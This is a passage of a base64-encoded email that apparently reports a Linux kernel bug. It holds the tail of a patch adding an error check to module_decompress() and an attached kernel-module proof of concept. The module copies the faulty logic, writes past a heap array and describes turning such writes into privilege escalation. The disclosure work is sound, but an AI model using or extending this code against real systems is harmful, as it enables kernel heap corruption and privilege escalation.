CiAJCQkJY29uc3Qgdm9pZCAqYnVmLCBzaXplX3Qgc2l6ZSkKIHsKIAl1bnNpZ25lZCBpbnQgbl9w
YWdlczsKLQlpbnQgZXJyb3I7CisJaW50IGVycm9yID0gMDsKIAlzc2l6ZV90IGRhdGFfc2l6ZTsK
IAogCW5fcGFnZXMgPSBESVZfUk9VTkRfVVAoc2l6ZSwgUEFHRV9TSVpFKSAqIDI7CisKIAllcnJv
ciA9IG1vZHVsZV9leHRlbmRfbWF4X3BhZ2VzKGluZm8sIG5fcGFnZXMpOworCWlmIChlcnJvcikK
KwkJcmV0dXJuIGVycm9yOworCiAJZGF0YV9zaXplID0gTU9EVUxFX0RFQ09NUFJFU1NfRk4oaW5m
bywgYnVmLCBzaXplKTsKIAlpZiAoZGF0YV9zaXplIDwgMCkgewogCQllcnJvciA9IGRhdGFfc2l6
ZTsKLS0gCjIuMzkuMAo=
--000000000000e3feeb0651fd86fc
Content-Type: text/x-csrc; charset="UTF-8"; name="poc_decompress_cwe252.c"
Content-Disposition: attachment; filename="poc_decompress_cwe252.c"
Content-Transfer-Encoding: base64
Content-ID: <f_mp9e67d91>
X-Attachment-Id: f_mp9e67d91

Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IEdQTC0yLjAKLyoKICogUG9DOiBGMSBISUdIIHwg
Q1dFLTI1MiB8IE1pc3NpbmcgZXJyb3IgY2hlY2sgaW4gbW9kdWxlX2RlY29tcHJlc3MoKQogKgog
KiBWdWxuZXJhYmxlIGNvZGUgKGtlcm5lbC9tb2R1bGUvZGVjb21wcmVzcy5jKToKICoKICogICBp
bnQgbW9kdWxlX2RlY29tcHJlc3Moc3RydWN0IGxvYWRfaW5mbyAqaW5mbywgY29uc3Qgdm9pZCAq
YnVmLCBzaXplX3Qgc2l6ZSkKICogICB7CiAqICAgICAgIHVuc2lnbmVkIGludCBuX3BhZ2VzOwog
KiAgICAgICBzc2l6ZV90IGRhdGFfc2l6ZTsKICogICAgICAgaW50IGVycm9yOwogKgogKiAgICAg
ICBuX3BhZ2VzID0gRElWX1JPVU5EX1VQKHNpemUsIFBBR0VfU0laRSkgKiAyOwogKiAgICAgICBl
cnJvciA9IG1vZHVsZV9leHRlbmRfbWF4X3BhZ2VzKGluZm8sIG5fcGFnZXMpOyAgLy8gPC0tIChB
KQogKiAgICAgICAvLyBFUlJPUiBSRVRVUk4gVkFMVUUgTkVWRVIgQ0hFQ0tFRCBIRVJFCiAqCiAq
ICAgICAgIGRhdGFfc2l6ZSA9IE1PRFVMRV9ERUNPTVBSRVNTX0ZOKGluZm8sIGJ1Ziwgc2l6ZSk7
IC8vIDwtLSAoQikKICogICAgICAgLy8gKEIpIGNhbGxzIG1vZHVsZV9nZXRfbmV4dF9wYWdlKCkg
d2hpY2ggY2FsbHMKICogICAgICAgLy8gbW9kdWxlX2V4dGVuZF9tYXhfcGFnZXMoKSBhZ2FpbiB3
aGVuIHBhZ2VzW10gaXMgZnVsbC4KICogICAgICAgLy8gQnV0IGlmIChBKSBmYWlsZWQsIGluZm8t
PnBhZ2VzIG1heSBiZSBOVUxMIG9yIHVuZGVyc2l6ZWQsCiAqICAgICAgIC8vIGFuZCBpbmZvLT5t
YXhfcGFnZXMgd2FzIE5PVCB1cGRhdGVkLgogKiAgICAgICAvLyBtb2R1bGVfZ2V0X25leHRfcGFn
ZSgpIHRoZW4gd3JpdGVzIGludG8gaW5mby0+cGFnZXNbdXNlZF9wYWdlcysrXQogKiAgICAgICAv
LyB3aXRoIHVzZWRfcGFnZXMgcG90ZW50aWFsbHkgZXhjZWVkaW5nIG1heF9wYWdlcyAtPiBPT0Ig
d3JpdGUuCiAqICAgfQogKgogKiBSb290IGNhdXNlOgogKiAgIG1vZHVsZV9leHRlbmRfbWF4X3Bh
Z2VzKCkgYXQgKEEpIGNhbiByZXR1cm4gLUVOT01FTSAoa3ZyZWFsbG9jIGZhaWwpLgogKiAgIFRo
ZSBjYWxsZXIgaWdub3JlcyB0aGlzIGFuZCBwcm9jZWVkcyB0byBkZWNvbXByZXNzLCB3cml0aW5n
IHBhZ2VzW10KICogICBlbnRyaWVzIGJleW9uZCB0aGUgYWxsb2NhdGVkIGFycmF5IGJvdW5kYXJ5
IC0+IGhlYXAgY29ycnVwdGlvbi4KICoKICogQXR0YWNrIHN1cmZhY2U6CiAqICAgLSBpbml0X21v
ZHVsZSgpIC8gZmluaXRfbW9kdWxlKCkgc3lzY2FsbHMgd2l0aCBhIGNvbXByZXNzZWQgLmtvCiAq
ICAgLSBSZXF1aXJlcyBDQVBfU1lTX01PRFVMRSAob3IgdXNlciBuYW1lc3BhY2VzIGlmIHVucHJp
dmlsZWdlZCBtb2R1bGUKICogICAgIGxvYWRpbmcgaXMgYWxsb3dlZDogL3Byb2Mvc3lzL2tlcm5l
bC9tb2R1bGVzX2Rpc2FibGVkID0gMCBhbmQKICogICAgIGtlcm5lbC51bnByaXZpbGVnZWRfdXNl
cm5zX2Nsb25lID0gMSkKICoKICogVGhpcyBQb0MgZGVtb25zdHJhdGVzIHRoZSBidWcgdXNpbmcg
YSBjcmFmdGVkIHN0cnVjdCBsb2FkX2luZm8KICogdGhhdCBzaW11bGF0ZXMgdGhlIGV4YWN0IGZh
aWx1cmUgcGF0aCwgdHJpZ2dlcmluZyBhIHdyaXRlIGJleW9uZAogKiB0aGUgcGFnZXNbXSBhcnJh
eS4gSW4gYSByZWFsIGV4cGxvaXQsIHRoaXMgb3ZlcndyaXRlcyBhZGphY2VudAogKiBoZWFwIG9i
amVjdHMgKGUuZy4sIHNsYWIgbWV0YWRhdGEsIGttYWxsb2MtNjQvMTI4IG9iamVjdHMpIHRvCiAq
IGFjaGlldmUgcHJpdmlsZWdlIGVzY2FsYXRpb24uCiAqCiAqIEJ1aWxkIChhcyBrZXJuZWwgbW9k
dWxlKToKICogICBtYWtlIC1DIC9saWIvbW9kdWxlcy8kKHVuYW1lIC1yKS9idWlsZCBNPSQocHdk
KSBtb2R1bGVzCiAqCiAqIE1ha2VmaWxlOgogKiAgIG9iai1tICs9IHBvY19kZWNvbXByZXNzX2N3
ZTI1Mi5vCiAqCiAqIFJ1bjoKICogICBzdWRvIGluc21vZCBwb2NfZGVjb21wcmVzc19jd2UyNTIu
a28KICogICBzdWRvIGRtZXNnIHwgZ3JlcCBQT0MKICovCgojaW5jbHVkZSA8bGludXgvbW9kdWxl
Lmg+CiNpbmNsdWRlIDxsaW51eC9rZXJuZWwuaD4KI2luY2x1ZGUgPGxpbnV4L3NsYWIuaD4KI2lu
Y2x1ZGUgPGxpbnV4L3ZtYWxsb2MuaD4KI2luY2x1ZGUgPGxpbnV4L2hpZ2htZW0uaD4KI2luY2x1
ZGUgPGxpbnV4L21tLmg+CiNpbmNsdWRlIDxsaW51eC9hdG9taWMuaD4KCk1PRFVMRV9MSUNFTlNF
KCJHUEwiKTsKTU9EVUxFX0FVVEhPUigic2VjdXJpdHktcmVzZWFyY2giKTsKTU9EVUxFX0RFU0NS
SVBUSU9OKCJQb0M6IENXRS0yNTIgbWlzc2luZyBlcnJvciBjaGVjayBpbiBtb2R1bGVfZGVjb21w
cmVzcyAoRjEgSElHSCkiKTsKCi8qIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqLwovKiBSZXBsaWNhdGUgdGhlIHJlbGV2
YW50IHBhcnRzIG9mIHN0cnVjdCBsb2FkX2luZm8gICAgICAgICAgICAgICAgICAgICovCi8qICh3
ZSBjYW5ub3QgaW5jbHVkZSBpbnRlcm5hbC5oIGZyb20gb3V0LW9mLXRyZWUgbW9kdWxlKSAgICAg
ICAgICAgICAgKi8KLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICovCgpzdHJ1Y3QgcG9jX2xvYWRfaW5mbyB7CiAgICBz
dHJ1Y3QgcGFnZSAgICoqcGFnZXM7ICAgICAgIC8qIGFycmF5IG9mIHBhZ2UgcG9pbnRlcnMgICAg
ICAgICAgICAgKi8KICAgIHVuc2lnbmVkIGludCAgICBtYXhfcGFnZXM7ICAgLyogYWxsb2NhdGVk
IHNsb3RzIGluIHBhZ2VzW10gICAgICAgICAqLwogICAgdW5zaWduZWQgaW50ICAgIHVzZWRfcGFn
ZXM7ICAvKiBwYWdlcyB3cml0dGVuIHNvIGZhciAgICAgICAgICAgICAgICovCiAgICAvKiBvdGhl
ciBsb2FkX2luZm8gZmllbGRzIG9taXR0ZWQg4oCUIG5vdCBuZWVkZWQgZm9yIHRoaXMgUG9DICAg
ICAgICAqLwp9OwoKLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICovCi8qIFJlcGxpY2F0ZSBtb2R1bGVfZXh0ZW5kX21h
eF9wYWdlcygpIGxvZ2ljICAgICAgICAgICAgICAgICAgICAgICAgICAgKi8KLyogLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
ICovCgpzdGF0aWMgaW50IHBvY19leHRlbmRfbWF4X3BhZ2VzKHN0cnVjdCBwb2NfbG9hZF9pbmZv
ICppbmZvLCB1bnNpZ25lZCBpbnQgZXh0ZW50KQp7CiAgICBzdHJ1Y3QgcGFnZSAqKm5ld19wYWdl
czsKICAgIHVuc2lnbmVkIGludCBuZXdfbWF4ID0gaW5mby0+bWF4X3BhZ2VzICsgZXh0ZW50OwoK
ICAgIG5ld19wYWdlcyA9IGt2cmVhbGxvYyhpbmZvLT5wYWdlcywKICAgICAgICAgICAgICAgICAg
ICAgICAgICBuZXdfbWF4ICogc2l6ZW9mKCppbmZvLT5wYWdlcyksCiAgICAgICAgICAgICAgICAg
ICAgICAgICAgR0ZQX0tFUk5FTCk7CiAgICBpZiAoIW5ld19wYWdlcykKICAgICAgICByZXR1cm4g
LUVOT01FTTsKCiAgICBpbmZvLT5wYWdlcyAgICA9IG5ld19wYWdlczsKICAgIGluZm8tPm1heF9w
YWdlcyA9IG5ld19tYXg7CiAgICByZXR1cm4gMDsKfQoKLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICovCi8qIFJlcGxp
Y2F0ZSBtb2R1bGVfZ2V0X25leHRfcGFnZSgpIGxvZ2ljICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgKi8KLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tICovCgpzdGF0aWMgc3RydWN0IHBhZ2UgKnBvY19nZXRfbmV4
dF9wYWdlKHN0cnVjdCBwb2NfbG9hZF9pbmZvICppbmZvKQp7CiAgICBzdHJ1Y3QgcGFnZSAqcGFn
ZTsKICAgIGludCBlcnJvcjsKCiAgICBpZiAoaW5mby0+bWF4X3BhZ2VzID09IGluZm8tPnVzZWRf
cGFnZXMpIHsKICAgICAgICBlcnJvciA9IHBvY19leHRlbmRfbWF4X3BhZ2VzKGluZm8sIGluZm8t
PnVzZWRfcGFnZXMpOwogICAgICAgIGlmIChlcnJvcikKICAgICAgICAgICAgcmV0dXJuIEVSUl9Q
VFIoZXJyb3IpOwogICAgfQoKICAgIHBhZ2UgPSBhbGxvY19wYWdlKEdGUF9LRVJORUwgfCBfX0dG
UF9ISUdITUVNKTsKICAgIGlmICghcGFnZSkKICAgICAgICByZXR1cm4gRVJSX1BUUigtRU5PTUVN
KTsKCiAgICAvKgogICAgICogVlVMTkVSQUJJTElUWSBUUklHR0VSOgogICAgICogSWYgdGhlIGlu
aXRpYWwgcG9jX2V4dGVuZF9tYXhfcGFnZXMoKSBpbiBwb2NfZGVjb21wcmVzcygpIGZhaWxlZAog
ICAgICogKHJldHVybmluZyAtRU5PTUVNLCBlcnJvciBpZ25vcmVkKSwgdGhlbiBpbmZvLT5tYXhf
cGFnZXMgd2FzIE5PVAogICAgICogdXBkYXRlZC4gdXNlZF9wYWdlcyB3aWxsIHJlYWNoIG1heF9w
YWdlcyBxdWlja2x5IGFuZCB0aGlzIHBhdGgKICAgICAqIGNhbGxzIHBvY19leHRlbmRfbWF4X3Bh
Z2VzKCkgYWdhaW4g4oCUIGJ1dCBwYWdlc1tdIGl0c2VsZiBtYXkgYmUKICAgICAqIE5VTEwgb3Ig
cG9pbnQgdG8gYW4gdW5kZXJzaXplZCBhbGxvY2F0aW9uLCBjYXVzaW5nIHRoZSBhc3NpZ25tZW50
CiAgICAgKiBiZWxvdyB0byB3cml0ZSBPT0IgaW50byBoZWFwIG1lbW9yeS4KICAgICAqLwogICAg
aW5mby0+cGFnZXNbaW5mby0+dXNlZF9wYWdlcysrXSA9IHBhZ2U7CiAgICByZXR1cm4gcGFnZTsK
fQoKLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tICovCi8qIFNpbXVsYXRlIHRoZSB2dWxuZXJhYmxlIG1vZHVsZV9kZWNv
bXByZXNzKCkgcGF0aCAgICAgICAgICAgICAgICAgICAgKi8KLyogICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLwovKiBX
ZSBpbmplY3QgYSBmYWlsdXJlIGF0IHRoZSBpbml0aWFsIGV4dGVuZCBzdGVwIGJ5IGFydGlmaWNp
YWxseSAgICAgICovCi8qIGV4aGF1c3RpbmcgdGhlIGFsbG9jYXRpb24sIHRoZW4gcHJvY2VlZCBh
cyB0aGUgcmVhbCBjb2RlIGRvZXMgICAgICAgKi8KLyogKGlnbm9yaW5nIHRoZSBlcnJvcikgdG8g
ZGVtb25zdHJhdGUgdGhlIE9PQiB3cml0ZS4gICAgICAgICAgICAgICAgICAqLwovKiAtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0gKi8KCi8qCiAqIFNlbnRpbmVsIHZhbHVlIHdyaXR0ZW4gQUZURVIgdGhlIHBhZ2VzW10gYXJy
YXkgdG8gZGV0ZWN0IE9PQiB3cml0ZS4KICogSW4gYSByZWFsIGV4cGxvaXQsIHRoaXMgcmVnaW9u
IGNvbnRhaW5zIGEgbGl2ZSBoZWFwIG9iamVjdC4KICovCiNkZWZpbmUgU0VOVElORUwgMHhERUFE
QkVFRkRFQURCRUVGVUxMCgpzdGF0aWMgaW50IHBvY19kZWNvbXByZXNzX3RyaWdnZXIodm9pZCkK
ewogICAgc3RydWN0IHBvY19sb2FkX2luZm8gaW5mbyA9IHsgMCB9OwogICAgdW5zaWduZWQgbG9u
ZyAgICAgICAgKmNhbmFyeTsKICAgIHN0cnVjdCBwYWdlICAgICAgICAgICpwYWdlOwogICAgdW5z
aWduZWQgaW50ICAgICAgICAgIG5fcGFnZXM7CiAgICB1bnNpZ25lZCBpbnQgICAgICAgICAgaTsK
ICAgIGludCAgICAgICAgICAgICAgICAgICBlcnJvcjsKICAgIGludCAgICAgICAgICAgICAgICAg
ICBvb2JfZGV0ZWN0ZWQgPSAwOwoKICAgIC8qCiAgICAgKiBTdGVwIDE6IGFsbG9jYXRlIGEgc21h
bGwgcGFnZXNbXSBhcnJheSDigJQgNCBzbG90cy4KICAgICAqIFRoaXMgc2ltdWxhdGVzIGluZm8t
PnBhZ2VzIGJlaW5nIGluaXRpYWxpemVkIGVhcmxpZXIgaW4KICAgICAqIHRoZSByZWFsIG1vZHVs
ZSBsb2FkaW5nIHBhdGguCiAgICAgKi8KICAgIG5fcGFnZXMgPSA0OwogICAgaW5mby5wYWdlcyA9
IGt2bWFsbG9jKG5fcGFnZXMgKiBzaXplb2YoKmluZm8ucGFnZXMpLCBHRlBfS0VSTkVMKTsKICAg
IGlmICghaW5mby5wYWdlcykgewogICAgICAgIHByX2VycigiUE9DOiBpbml0aWFsIGt2bWFsbG9j
IGZhaWxlZFxuIik7CiAgICAgICAgcmV0dXJuIC1FTk9NRU07CiAgICB9CiAgICBpbmZvLm1heF9w
YWdlcyAgPSBuX3BhZ2VzOwogICAgaW5mby51c2VkX3BhZ2VzID0gMDsKCiAgICAvKgogICAgICog
UGxhY2UgYSBjYW5hcnkgd29yZCBpbW1lZGlhdGVseSBhZnRlciB0aGUgcGFnZXNbXSBhcnJheS4K
ICAgICAqIEluIHByb2R1Y3Rpb24sIHRoaXMgc2xvdCBpcyBvY2N1cGllZCBieSBhIGxpdmUgaGVh
cCBvYmplY3QKICAgICAqIChlLmcuLCB0aGUgbmV4dCBrbWFsbG9jIHNsYWIgb2JqZWN0IGluIHRo
ZSBzYW1lIGNhY2hlKS4KICAgICAqCiAgICAgKiBXZSBhbGxvY2F0ZSBwYWdlc1tdICsgY2FuYXJ5
IGFzIGEgY29udGlndW91cyBibG9jayB0byBndWFyYW50ZWUKICAgICAqIGFkamFjZW5jeSBpbiB0
aGUgc2xhYiBhbGxvY2F0b3IuCiAgICAgKi8KICAgIGt2ZnJlZShpbmZvLnBhZ2VzKTsKICAgIGlu
Zm8ucGFnZXMgPSBrdm1hbGxvYygobl9wYWdlcyArIDEpICogc2l6ZW9mKCppbmZvLnBhZ2VzKSwg
R0ZQX0tFUk5FTCk7CiAgICBpZiAoIWluZm8ucGFnZXMpIHsKICAgICAgICBwcl9lcnIoIlBPQzog
Y2FuYXJ5IGt2bWFsbG9jIGZhaWxlZFxuIik7CiAgICAgICAgcmV0dXJuIC1FTk9NRU07CiAgICB9
CiAgICBpbmZvLm1heF9wYWdlcyAgPSBuX3BhZ2VzOyAgIC8qIGludGVudGlvbmFsbHkgTk9UIG5f
cGFnZXMrMSAqLwogICAgaW5mby51c2VkX3BhZ2VzID0gMDsKCiAgICAvKiBXcml0ZSBjYW5hcnkg
aW50byBzbG90IFtuX3BhZ2VzXSDigJQganVzdCBwYXN0IHRoZSAidmFsaWQiIHJlZ2lvbiAqLwog
ICAgY2FuYXJ5ICA9ICh1bnNpZ25lZCBsb25nICopJmluZm8ucGFnZXNbbl9wYWdlc107CiAgICAq
Y2FuYXJ5ID0gU0VOVElORUw7CgogICAgcHJfaW5mbygiUE9DOiBwYWdlc1tdICBAICVweCAgc2l6
ZT0ldSBzbG90c1xuIiwgaW5mby5wYWdlcywgbl9wYWdlcyk7CiAgICBwcl9pbmZvKCJQT0M6IGNh
bmFyeSAgIEAgJXB4ICB2YWx1ZT0weCVsbHhcbiIsCiAgICAgICAgICAgIGNhbmFyeSwgKHVuc2ln
bmVkIGxvbmcgbG9uZykqY2FuYXJ5KTsKCiAgICAvKgogICAgICogU3RlcCAyOiBzaW11bGF0ZSB0
aGUgRkFJTElORyBpbml0aWFsIGV4dGVuZC4KICAgICAqCiAgICAgKiBJbiB0aGUgcmVhbCBidWcs
IG1vZHVsZV9kZWNvbXByZXNzKCkgY2FsbHM6CiAgICAgKiAgIGVycm9yID0gbW9kdWxlX2V4dGVu
ZF9tYXhfcGFnZXMoaW5mbywgbl9wYWdlcyk7CiAgICAgKiBhbmQgaWdub3JlcyB0aGUgcmV0dXJu
IHZhbHVlLgogICAgICoKICAgICAqIFdlIHNpbXVsYXRlIHRoZSBmYWlsdXJlIGJ5IE5PVCBjYWxs
aW5nIGV4dGVuZCBoZXJlIOKAlCBpbmZvLT5tYXhfcGFnZXMKICAgICAqIHN0YXlzIGF0IG5fcGFn
ZXMgKDQpLCBleGFjdGx5IGFzIGlmIGV4dGVuZCBoYWQgZmFpbGVkIGFuZCB0aGUgZXJyb3IKICAg
ICAqIHdhcyBzaWxlbnRseSBkcm9wcGVkLgogICAgICoKICAgICAqIChJbiBhIHJlYWwgYXR0YWNr
LCB0aGUgZmFpbHVyZSBpcyBpbmR1Y2VkIGJ5IG1lbW9yeSBwcmVzc3VyZSBvcgogICAgICogIGJ5
IHJhY2luZyB3aXRoIGFub3RoZXIgYWxsb2NhdGlvbiB0byBleGhhdXN0IHRoZSBzbGFiLikKICAg
ICAqLwogICAgcHJfaW5mbygiUE9DOiBzaW11bGF0aW5nIGV4dGVuZCBmYWlsdXJlIChlcnJvciBp
Z25vcmVkIGFzIGluIHVwc3RyZWFtKVxuIik7CiAgICBlcnJvciA9IC1FTk9NRU07IC8qIHdoYXQg
ZXh0ZW5kIHdvdWxkIGhhdmUgcmV0dXJuZWQgKi8KICAgIC8qIGVycm9yIGlzIGludGVudGlvbmFs
bHkgTk9UIGNoZWNrZWQg4oCUIG1pcnJvcmluZyB0aGUga2VybmVsIGJ1ZyAqLwogICAgKHZvaWQp
ZXJyb3I7CgogICAgLyoKICAgICAqIFN0ZXAgMzogcHJvY2VlZCB3aXRoIGRlY29tcHJlc3Npb24g
bG9vcCDigJQgc2FtZSBhcyBNT0RVTEVfREVDT01QUkVTU19GTi4KICAgICAqCiAgICAgKiBXZSBp
dGVyYXRlIG1vcmUgdGhhbiBuX3BhZ2VzIHRpbWVzIHRvIGZvcmNlIHVzZWRfcGFnZXMgPiBtYXhf
cGFnZXMuCiAgICAgKiBwb2NfZ2V0X25leHRfcGFnZSgpIHdpbGwgd3JpdGUgaW5mby0+cGFnZXNb
NF0sIFs1XSwgLi4uIE9PQi4KICAgICAqLwogICAgcHJfaW5mbygiUE9DOiBzdGFydGluZyBkZWNv
bXByZXNzIGxvb3AgKHdpbGwgd3JpdGUgJXUgcGFnZXMsIGxpbWl0PSV1KVxuIiwKICAgICAgICAg
ICAgbl9wYWdlcyArIDIsIG5fcGFnZXMpOwoKICAgIGZvciAoaSA9IDA7IGkgPCBuX3BhZ2VzICsg
MjsgaSsrKSB7CiAgICAgICAgcGFnZSA9IHBvY19nZXRfbmV4dF9wYWdlKCZpbmZvKTsKICAgICAg
ICBpZiAoSVNfRVJSKHBhZ2UpKSB7CiAgICAgICAgICAgIHByX2luZm8oIlBPQzogZ2V0X25leHRf
cGFnZSByZXR1cm5lZCBlcnJvciBhdCBpPSV1OiAlbGRcbiIsCiAgICAgICAgICAgICAgICAgICAg
aSwgUFRSX0VSUihwYWdlKSk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAg
cHJfaW5mbygiUE9DOiB3cm90ZSBwYWdlc1sldV0gPSAlcHggIChtYXhfcGFnZXM9JXUpXG4iLAog
ICAgICAgICAgICAgICAgaW5mby51c2VkX3BhZ2VzIC0gMSwgcGFnZSwgaW5mby5tYXhfcGFnZXMp
OwoKICAgICAgICAvKgogICAgICAgICAqIENoZWNrIGlmIHRoZSBPT0Igd3JpdGUgY2xvYmJlcmVk
IHRoZSBjYW5hcnkuCiAgICAgICAgICogSW4gYSByZWFsIGV4cGxvaXQsIHRoaXMgc2xvdCBjb250
YWlucyBhIGhlYXAgb2JqZWN0CiAgICAgICAgICogd2hvc2UgY29ycnVwdGlvbiBsZWFkcyB0byBj
b2RlIGV4ZWN1dGlvbi4KICAgICAgICAgKi8KICAgICAgICBpZiAoKmNhbmFyeSAhPSBTRU5USU5F
TCkgewogICAgICAgICAgICBwcl93YXJuKCJQT0M6IFtPT0IgV1JJVEUgQ09ORklSTUVEXSBjYW5h
cnkgY2xvYmJlcmVkIVxuIik7CiAgICAgICAgICAgIHByX3dhcm4oIlBPQzogY2FuYXJ5IEAgJXB4
OiBleHBlY3RlZD0weCVsbHggZ290PTB4JWxseFxuIiwKICAgICAgICAgICAgICAgICAgICBjYW5h
cnksCiAgICAgICAgICAgICAgICAgICAgKHVuc2lnbmVkIGxvbmcgbG9uZylTRU5USU5FTCwKICAg
ICAgICAgICAgICAgICAgICAodW5zaWduZWQgbG9uZyBsb25nKSpjYW5hcnkpOwogICAgICAgICAg
ICBvb2JfZGV0ZWN0ZWQgPSAxOwogICAgICAgIH0KICAgIH0KCiAgICAvKiBTdGVwIDQ6IHJlcG9y
dCAqLwogICAgaWYgKG9vYl9kZXRlY3RlZCkgewogICAgICAgIHByX3dhcm4oIlBPQzogVlVMTkVS
QUJJTElUWSBDT05GSVJNRURcbiIpOwogICAgICAgIHByX3dhcm4oIlBPQzogbW9kdWxlX2RlY29t
cHJlc3MoKSBpZ25vcmVkIC1FTk9NRU0gZnJvbVxuIik7CiAgICAgICAgcHJfd2FybigiUE9DOiBt
b2R1bGVfZXh0ZW5kX21heF9wYWdlcygpLCB0aGVuIHdyb3RlIE9PQiBpbnRvXG4iKTsKICAgICAg
ICBwcl93YXJuKCJQT0M6IGhlYXAgbWVtb3J5IGFkamFjZW50IHRvIHBhZ2VzW10gYXJyYXkuXG4i
KTsKICAgICAgICBwcl93YXJuKCJQT0M6IEluIHByb2R1Y3Rpb246IGFkamFjZW50IHNsYWIgb2Jq
ZWN0IGNvcnJ1cHRlZCAtPlxuIik7CiAgICAgICAgcHJfd2FybigiUE9DOiBoZWFwIGdyb29taW5n
IC0+IHByaXZpbGVnZSBlc2NhbGF0aW9uLlxuIik7CiAgICB9IGVsc2UgaWYgKGluZm8udXNlZF9w
YWdlcyA+IG5fcGFnZXMpIHsKICAgICAgICBwcl93YXJuKCJQT0M6IHVzZWRfcGFnZXM9JXUgZXhj
ZWVkZWQgbWF4X3BhZ2VzPSV1XG4iLAogICAgICAgICAgICAgICAgaW5mby51c2VkX3BhZ2VzLCBu
X3BhZ2VzKTsKICAgICAgICBwcl93YXJuKCJQT0M6IE9PQiB3cml0ZSBvY2N1cnJlZCBidXQgY2Fu
YXJ5IHN1cnZpdmVkIChzbGFiIHBhZGRpbmcpLlxuIik7CiAgICAgICAgcHJfd2FybigiUE9DOiBJ
bmNyZWFzZSBuX3BhZ2VzIG9yIHVzZSBLQVNBTiB0byBjb25maXJtLlxuIik7CiAgICB9IGVsc2Ug
ewogICAgICAgIHByX2luZm8oIlBPQzogbm8gT09CIHRyaWdnZXJlZCBpbiB0aGlzIHJ1bi5cbiIp
OwogICAgfQoKICAgIC8qIENsZWFudXA6IGZyZWUgYWxsIGFsbG9jYXRlZCBwYWdlcyAqLwogICAg
Zm9yIChpID0gMDsgaSA8IGluZm8udXNlZF9wYWdlczsgaSsrKQogICAgICAgIGlmIChpbmZvLnBh
Z2VzW2ldICYmICFJU19FUlIoaW5mby5wYWdlc1tpXSkpCiAgICAgICAgICAgIF9fZnJlZV9wYWdl
KGluZm8ucGFnZXNbaV0pOwoKICAgIGt2ZnJlZShpbmZvLnBhZ2VzKTsKICAgIHJldHVybiBvb2Jf
ZGV0ZWN0ZWQgPyAwIDogLUVBR0FJTjsKfQoKLyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICovCi8qIE1vZHVsZSBpbml0
IC8gZXhpdCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICovCi8qIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLSAqLwoKc3RhdGljIGludCBfX2luaXQgcG9jX2luaXQodm9pZCkKewog
ICAgaW50IHJldDsKCiAgICBwcl9pbmZvKCJQT0M6IEYxIEhJR0ggQ1dFLTI1MiDigJQgbW9kdWxl
X2RlY29tcHJlc3MgbWlzc2luZyBlcnJvciBjaGVja1xuIik7CiAgICBwcl9pbmZvKCJQT0M6IGtl
cm5lbC9tb2R1bGUvZGVjb21wcmVzcy5jIDo6IG1vZHVsZV9kZWNvbXByZXNzKClcbiIpOwogICAg
cHJfaW5mbygiUE9DOiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tXG4iKTsKCiAgICAvKgogICAgICogUnVuIHdpdGggS0FTQU4gZW5hYmxlZCBmb3Ig
YmVzdCByZXN1bHRzOgogICAgICogICBDT05GSUdfS0FTQU49eQogICAgICogICBDT05GSUdfS0FT
QU5fR0VORVJJQz15CiAgICAgKiBLQVNBTiB3aWxsIHJlcG9ydCB0aGUgT09CIHdyaXRlIHByZWNp
c2VseSB3aXRoIGEgZnVsbCBzdGFjayB0cmFjZS4KICAgICAqCiAgICAgKiBXaXRob3V0IEtBU0FO
LCB3ZSByZWx5IG9uIHRoZSBjYW5hcnkgc2VudGluZWwgdG8gZGV0ZWN0IGNvcnJ1cHRpb24uCiAg
ICAgKi8KICAgIHJldCA9IHBvY19kZWNvbXByZXNzX3RyaWdnZXIoKTsKCiAgICBpZiAocmV0ID09
IDApCiAgICAgICAgcHJfd2FybigiUE9DOiBTVUNDRVNTIOKAlCBoZWFwIGNvcnJ1cHRpb24gZGVt
b25zdHJhdGVkXG4iKTsKICAgIGVsc2UKICAgICAgICBwcl9pbmZvKCJQT0M6IHJ1biBvbiBLQVNB
TiBrZXJuZWwgZm9yIGRlZmluaXRpdmUgY29uZmlybWF0aW9uXG4iKTsKCiAgICAvKgogICAgICog
UmV0dXJuIG5vbi16ZXJvIHNvIHRoZSBtb2R1bGUgYXV0by11bmxvYWRzIGFmdGVyIGluaXQuCiAg
ICAgKiBUaGlzIGF2b2lkcyBsZWF2aW5nIGEgdGFpbnRlZCBtb2R1bGUgbG9hZGVkIHVubmVjZXNz
